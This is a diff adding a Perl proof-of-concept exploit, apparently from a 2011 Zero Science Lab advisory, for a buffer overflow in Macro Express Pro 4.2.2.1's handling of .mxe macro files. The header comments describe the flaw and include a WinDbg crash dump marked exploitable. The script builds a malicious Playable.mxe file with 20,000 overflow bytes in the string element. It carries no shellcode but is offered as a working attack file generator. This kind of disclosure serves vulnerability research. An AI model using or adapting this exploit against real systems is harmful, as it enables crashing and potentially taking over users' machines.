@@ -1,0 +1,103 @@
+#!/usr/local/bin/perl
+#
+#
+# Macro Express Pro 4.2.2.1 MXE File Syntactic Analysis Buffer Overflow PoC
+#
+#
+# Vendor: Insight Software Solutions, Inc.
+# Product web page: http://www.macros.com
+# Affected version: 4.2.2.1 and 4.2.1.1
+#
+# Summary: Macro Express is the premier Windows macro utility. With
+# Macro Express, you can record, edit and play back mouse and keyboard
+# macros. Its powerful tools and robust features will make you more
+# productive.
+#
+# Desc: Macro Express Pro suffers from a buffer overflow vulnerability when
+# importing playable macro files (.mxe) with added large amount of bytes into
+# the elements: string, integer, float and control. The user input is not
+# properly sanitized which may give the attackers the possibility for an
+# arbitrary code execution on the affected system. Failure of exploitation
+# may result in a denial of service.
+#
+# ~ Note: The PoC file is made with the script:
+#
+# <OPEN FOLDER Path="%ALLUSERSPROFILE%"/>
+#
+# Which when double clicking the .mxe poc file, 100% CPU usage and OS
+# hanging occurs.
+#
+# ~
+#
+# Tested on: Microsoft Windows XP Professional SP3 (EN)
+#
+#
+# -------------------------------------------------------------------
+#
+# (db0.37c): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=41414141 ebx=00000000 ecx=00000000 edx=01171cd8 esi=01171cd8 edi=00000000
+# eip=7c919af2 esp=0014f288 ebp=0014f2fc iopl=0         nv up ei pl nz na pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+# ntdll!RtlpWaitForCriticalSection+0x5b:
+# 7c919af2 ff4010          inc     dword ptr [eax+10h]  ds:0023:41414151=????????
+# 0:000> g
+# (db0.37c): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=41414141 ebx=0116ca00 ecx=0114dc90 edx=41414140 esi=41414140 edi=0014f330
+# eip=0042633d esp=0014e870 ebp=0014e8a0 iopl=0         nv up ei ng nz ac pe cy
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010297
+# macedit+0x2633d:
+# 0042633d 8b04b0          mov     eax,dword ptr [eax+esi*4] ds:0023:46464641=????????
+# 0:000> !exploitable
+# Exploitability Classification: EXPLOITABLE
+# User Mode Write AV starting at ntdll!RtlpWaitForCriticalSection+0x000000000000005b (Hash=0x351d4e4e.0x3f68114b)
+# 
+# User mode write access violations that are not near NULL are exploitable.
+#
+# -------------------------------------------------------------------
+#
+#
+# Vulnerability discovered by: Gjoko 'LiquidWorm' Krstic
+# liquidworm gmail com
+#
+# Zero Science Lab - http://www.zeroscience.mk
+#
+# Advisory ID: ZSL-2011-4986
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-4986.php
+#
+# 06.01.2011
+#
+
+
+use strict;
+
+print qq{
+
+------------------------------------------------------------------------------
+|                                                                            |
+| Macro Express Pro 4.2.2.1 MXE File Syntactic Analysis Buffer Overflow PoC  |
+|                                                                            |
+|                    Copyleft (c) 2011, Zero Science Lab                     |
+|                                                                            |
+------------------------------------------------------------------------------
+	};
+
+my $bytes = "\x41" x 20000;
+
+my $format = "<<Macro Express 4 Playable Macro>>\x0d\x0a".
+	     "[string:%$bytes% elements:99 global:true]\x0d\x0a". # Default: string:%T%...
+	     "[integer:%N% elements:99 global:true]\x0d\x0a".
+	     "[float:%D% elements:99 global:true]\x0d\x0a".
+	     "[control:%C% elements:99 global:true]\x0d\x0a".
+	     "<<BEGIN SCRIPT>>\x0d\x0a".
+	     "<OPEN FOLDER Path=\"%ALLUSERSPROFILE%\"/>";
+
+my $file = "Playable.mxe";
+print "\n\n[*] Creating $file file...\n";
+open mxe, ">./$file" || die "\nCan't open $file: $!";
+print mxe $format;
+print "\n[.] File successfully mounted!\n\n";
+close mxe;
